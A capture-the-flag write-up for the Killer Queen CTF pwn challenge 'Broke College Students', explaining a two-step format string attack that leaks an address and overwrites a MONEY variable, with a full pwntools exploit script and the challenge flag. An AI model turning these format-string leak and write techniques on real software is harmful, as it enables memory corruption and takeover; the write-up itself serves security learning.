---
layout: writeup
title: Broke College Students
ctf: Killer Queen CTF
points: 293
solves: 84
tags: 
    - pwn
date: 2021-11-01
description: |-
    The lengths that some people go to in order to pay for college.
flag: kqctf{did_you_resort_to_selling_NFTs_for_college_money_????}
---
<details>
    <summary>tl;dr</summary>
    
</details>

***

## Introduction

Basic idea:
Format string attack in two steps.
Step 1: leak an address, find the same offset with `objdump`, add offset of `MONEY` -- result is real address of `MONEY` in memory, which we want to override.
Step 2: Use format string to write 999999 characters followed by `%n`, allowing us to place that value in an address we specify afterwards -- so we specify the `MONEY` address to get that amount of money.
This allows us to buy the flag.

```python
from pwn import *

p = remote("143.198.184.186", 5001)
#p = process("./brokecollegestudents")

def send_string(choice):
    p.recvuntil(b": ")
    p.sendline(b"1")
    p.recv()
    p.sendline(b"1")
    p.recvuntil(b": ")
    p.recvuntil(b": ")
    p.sendline(b"1")
    p.recvuntil(b": ")
    p.sendline(choice)
    p.recvlines(2)
    return p.recvline().split(b"What")[0]


leaked_addr = int(send_string(b"%8$p")[2:], 16)
log.success(f"ADDRESS LEAK: {hex(leaked_addr)}")

addr_offset = 0x1160
base_addr = leaked_addr - addr_offset
money_offset = 0x401c
money_addr = p64(base_addr + money_offset)

send_string(f"%99999999c%8$n__".encode() + money_addr)

p.interactive()
```